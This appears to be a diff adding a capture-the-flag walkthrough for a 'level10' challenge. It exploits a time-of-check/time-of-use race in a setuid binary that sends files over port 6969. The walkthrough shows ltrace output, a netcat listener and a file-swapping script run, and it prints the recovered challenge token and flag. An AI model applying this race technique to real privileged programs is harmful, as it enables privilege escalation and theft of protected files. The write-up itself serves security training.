@@ -1,0 +1,47 @@
+#once again we find a binary and a token file in the directory
+#token isn't readable this time
+./level10
+./level10 file host
+sends file to host if you have access to it
+
+ltrace ./level10 token 127.0.0.1
+__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4)                                                     = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+)                       = 31
++++ exited (status 31) +++
+
+#the binary uses access() to check if we have permissions
+#we can test with a file we own
+
+./level10 /tmp/test 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
+
+#after checking for permissions, the process tries to connect through port 6969
+#using netcat tool (nc), we can listen to the port before connecting
+#we will need another session for this
+
+#session 1:
+touch /tmp/test
+./level10 /tmp/test 127.0.0.1
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+#session 2:
+nc -l 6969
+.*( )*.
+
+#once the connection is made, the binary prints the contents of the file
+#we can swap the real file in after the binary calls access(), before print
+#run script.sh and ctrl+C shortly after. the token will show up in logs:
+sh /tmp/script.sh
+Connecting to 127.0.0.1:6969 .. Connected!
+.*( )*.
+Sending file .. wrote file!
+woupa2yuojeeaaed06riuj63c
+
+su flag10
+woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
